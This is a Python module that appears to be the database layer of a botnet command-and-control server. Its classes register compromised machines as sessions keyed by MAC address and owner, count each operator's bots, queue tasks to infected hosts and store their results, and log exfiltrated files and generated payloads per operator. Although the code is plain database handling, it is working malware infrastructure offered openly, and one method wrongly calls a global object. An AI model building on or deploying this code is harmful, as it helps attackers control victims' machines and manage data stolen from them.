# standard library
import math
import hashlib
from datetime import datetime

from botnet.models import db, User, Session, Task, Payload, ExfiltratedFile
from botnet import utils


class UserDAO:
    def __init__(self, model):
        self.model = model
    
    def get_user(self, user_id=None, username=None):
        user = None
        if user_id:
            user = db.session.query(self.model).get(user_id)
        elif username:
            user = db.session.query(self.model).filter_by(username=username).first()
        return user

    def add_user(self, username, hashed_password):
        user = User(username=username, password=hashed_password)
        db.session.add(user)
        db.session.commit()
        return user


class SessionDAO:
    def __init__(self, model, user_dao):
        self.model = model
        self.user_dao = user_dao

    def get_session(self, session_uid):
        return db.session.query(self.model).filter_by(uid=session_uid).first()

    def get_user_sessions(self, user_id):
        user = self.user_dao.get_user(user_id=user_id)
        if user:
            return user.sessions
        return []

    def get_user_sessions_new(self, user_id):
        user = self.user_dao.get_user(user_id=user_id)
        new_sessions = []
        if user:
            sessions = user.sessions
            for s in sessions:
                if s.new:
                    s.new = False
                    new_sessions.append(s)
        db.session.commit()
        return new_sessions
    
    def handle_session(self, session_dict):
        if not session_dict.get('uid'):
            identity = str(session_dict['mac_address'] + session_dict['owner']).encode()
            session_dict['uid'] = hashlib.md5(identity).hexdigest()
        
        session_dict['online'] = True

        session = self.get_session(session_dict['uid'])

        if not session:
            session_dict['joined'] = datetime.utcnow()
            user = self.user_dao.get_user(username=session_dict['owner'])
            if user:
                sessions = user.sessions
                if sessions:
                    session_dict['id'] = 1 + max([s.id for s in sessions])
                else:
                    session_dict['id'] = 1

                session = Session(**session_dict)
                db.session.add(session)
                user.bots += 1
                db.session.commit()
            else:
                utils.log("User not found: " + session_dict['owner'])
        else:
            session.online = True
            db.session.commit()

        if session:
            session.new = True
            session_dict['id'] = session.id
            db.session.commit()
        
        return session_dict

    def update_session_status(self, session_uid, status):
        session = db.session.query(self.model).filter_by(uid=session_uid).first()
        if session:
            session.online = bool(status)
            db.session.commit()

    def delete_session(self, session_uid):
        session = db.session.query(self.model).filter_by(uid=session_uid)
        if session:
            session.delete()
            db.session.commit()


class TaskDAO:
    def __init__(self, model, session_dao, user_dao):
        self.model = model
        self.session_dao = session_dao
        self.user_dao = user_dao

    def get_task(self, task_uid):
        return db.session.query(self.model).filter_by(uid=task_uid).first()
    
    def get_user_tasks(self, user_id):
        user = self.user_dao.get_user(user_id=user_id)
        if user:
            return user.tasks
        return []

    def get_session_tasks(self, session_uid):
        session = session_dao.get_session(session_uid)
        if session:
            return session.tasks
        return []
    
    def handle_task(self, task_dict):
        if not task_dict.get('uid'):
            identity = str(str(task_dict.get('session')) + str(task_dict.get('task')) + datetime.utcnow().__str__()).encode()
            task_dict['uid'] = hashlib.md5(identity).hexdigest()
            task_dict['issued'] = datetime.utcnow()
            task = Task(**task_dict)
            db.session.add(task)
            task_dict['issued'] = task_dict.get('issued').__str__()
        else:
            task = self.get_task(task_dict.get('uid'))
            if task:
                task.result = task_dict.get('result')
                task.completed = datetime.utcnow()
        db.session.commit()
        return task_dict


class FileDAO:
    def __init__(self, model, user_dao):
        self.model = model
        self.user_dao = user_dao

    def add_user_file(self, owner, filename, session, module):
        user = self.user_dao.get_user(username=owner)
        if user:
            exfiltrated_file = ExfiltratedFile(filename=filename,
                                            session=session,
                                            module=module,
                                            owner=user.username)
            db.session.add(exfiltrated_file)
            db.session.commit()
            return exfiltrated_file

    def get_user_files(self, user_id):
        user = self.user_dao.get_user(user_id=user_id)
        if user:  
            return user.files
        return []


class PayloadDAO:
    def __init__(self, model, user_dao):
        self.model = model
        self.user_dao = user_dao 

    def get_user_payloads(self, user_id):
        user = self.user_dao.get_user(user_id=user_id)
        if user:
            return user.payloads
        return []

    def add_user_payload(self, user_id, filename, format):
        user = self.user_dao.get_user(user_id=user_id)
        if user:
            payload = Payload(filename=filename,
                              format=format,
                              owner=user.username)
            db.session.add(payload)
            db.session.commit()
            return payload

user_dao = UserDAO(User)
session_dao = SessionDAO(Session, user_dao)
task_dao = TaskDAO(Task, session_dao, user_dao)
payload_dao = PayloadDAO(Payload, user_dao)
file_dao = FileDAO(ExfiltratedFile, user_dao)
